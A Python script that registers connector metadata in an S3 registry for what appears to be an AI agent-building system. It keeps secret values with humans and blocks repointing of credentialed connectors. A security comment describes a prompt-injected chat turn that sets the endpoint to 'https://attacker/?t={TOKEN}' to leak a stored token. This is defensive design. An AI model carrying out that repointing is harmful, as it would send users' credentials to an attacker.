#!/usr/bin/env python3
"""Register a new connector in the registry (metadata only — NEVER a secret value).

Usage:
  # A REST API the agent calls with http_request, needing env creds:
  python3 register_connector.py meta-ads "Meta Ads" env \
      --description "Facebook/Instagram ad performance via Graph API" \
      --secret-keys META_ACCESS_TOKEN,META_AD_ACCOUNT_ID

  # A private MCP server whose Authorization header holds a token:
  python3 register_connector.py my-tools "My Tools" mcp \
      --url-template "https://tools.example.com/mcp" \
      --header-template '{"Authorization":"Bearer {TOKEN}"}' \
      --secret-keys TOKEN

  # A SigV4 AgentCore gateway (no secret — IAM is the credential):
  python3 register_connector.py ios-test "iOS Test Gateway" gateway \
      --gateway-url "https://abc.bedrock-agentcore.us-east-1.amazonaws.com/mcp"

Writes s3://$ARTIFACT_BUCKET/config/connectors.json. The connector's credential is
NOT set here: for kind=env/mcp with secret keys, status starts "needs_credentials"
and a HUMAN enters the values in the UI (Connectors tab -> Connect), which stores
them in Secrets Manager. You (the builder) must NEVER handle raw secret values.
"""

import argparse
import json
import os
import sys

import boto3

REGION = os.environ.get("AWS_REGION", "us-east-1")
ARTIFACT_BUCKET = os.environ["ARTIFACT_BUCKET"]

s3 = boto3.client("s3", region_name=REGION)


def read_registry():
    try:
        body = s3.get_object(Bucket=ARTIFACT_BUCKET, Key="config/connectors.json")["Body"].read()
        return json.loads(body)
    except s3.exceptions.NoSuchKey:
        return {"connectors": []}


def main():
    p = argparse.ArgumentParser()
    p.add_argument("connector_id")
    p.add_argument("name")
    p.add_argument("kind", choices=["env", "mcp", "gateway"])
    p.add_argument("--description", default="")
    p.add_argument("--secret-keys", default="", help="comma-separated key NAMES (never values)")
    p.add_argument("--url-template", default="")
    p.add_argument("--header-template", default="", help="JSON object; {KEY} placeholders")
    p.add_argument("--gateway-url", default="")
    args = p.parse_args()

    secret_keys = [k.strip() for k in args.secret_keys.split(",") if k.strip()]
    # A stray value that looks like a real token is a red flag — refuse it.
    for k in secret_keys:
        if len(k) > 60 or any(ch in k for ch in " \t"):
            raise SystemExit(f"VALIDATION FAILED: '{k}' looks like a value, not a key name")

    header_template = {}
    if args.header_template:
        try:
            header_template = json.loads(args.header_template)
        except json.JSONDecodeError:
            raise SystemExit("VALIDATION FAILED: --header-template must be valid JSON")

    needs_secret = args.kind != "gateway" and len(secret_keys) > 0

    from datetime import datetime, timezone
    now = datetime.now(timezone.utc).isoformat()

    reg = read_registry()
    connectors = [c for c in reg.get("connectors", []) if c.get("id") != args.connector_id]
    existed = len(connectors) != len(reg.get("connectors", []))
    prior = next((c for c in reg.get("connectors", []) if c.get("id") == args.connector_id), {})

    # SECURITY: once a connector holds credentials (status active), refuse to
    # silently repoint its endpoint. A prompt-injected chat turn could otherwise
    # set urlTemplate/headerTemplate to "https://attacker/?t={TOKEN}" and the
    # runtime would ship the real secret there on the next invoke. Endpoint changes
    # on a live connector require deleting + re-registering it (a human step in the
    # Connectors tab), which forces re-entry of the credential.
    if existed and prior.get("status") == "active":
        new_url = args.url_template or None
        new_headers = header_template or None
        if (new_url and new_url != prior.get("urlTemplate")) or (
            new_headers and new_headers != prior.get("headerTemplate")
        ):
            raise SystemExit(
                f"REFUSED: connector '{args.connector_id}' is active (has credentials). "
                "Changing its urlTemplate/headerTemplate is blocked — delete it in the "
                "Connectors tab and re-register to repoint it (forces credential re-entry)."
            )

    # Only https endpoints — a plaintext http target would leak a header/query token.
    for u in (args.url_template, args.gateway_url):
        if u and not u.startswith("https://"):
            raise SystemExit(f"VALIDATION FAILED: '{u}' must be an https:// URL")

    entry = {
        "id": args.connector_id,
        "name": args.name,
        "description": args.description or None,
        "kind": args.kind,
        "secretKeys": secret_keys,
        "urlTemplate": args.url_template or None,
        "headerTemplate": header_template or None,
        "gatewayUrl": args.gateway_url or None,
        "status": "needs_credentials" if needs_secret else "active",
        "createdBy": "routine-builder",
        "createdAt": prior.get("createdAt", now),
        "updatedAt": now,
    }
    connectors.append(entry)
    reg["connectors"] = connectors
    s3.put_object(
        Bucket=ARTIFACT_BUCKET,
        Key="config/connectors.json",
        Body=json.dumps(reg, indent=2).encode(),
        ContentType="application/json",
    )

    print(json.dumps({
        "connectorId": args.connector_id,
        "action": "replaced" if existed else "added",
        "status": entry["status"],
        "notice": (
            f"NEEDS_CREDENTIALS: a human must open the Connectors tab, find '{args.name}', "
            f"and enter values for {secret_keys} (stored in Secrets Manager, never seen by you). "
            "Until then, agents bound to this connector will run without its credentials."
        ) if needs_secret else "Connector is ready (no secret required).",
    }, indent=2))


if __name__ == "__main__":
    try:
        main()
    except SystemExit as e:
        print(str(e), file=sys.stderr)
        raise
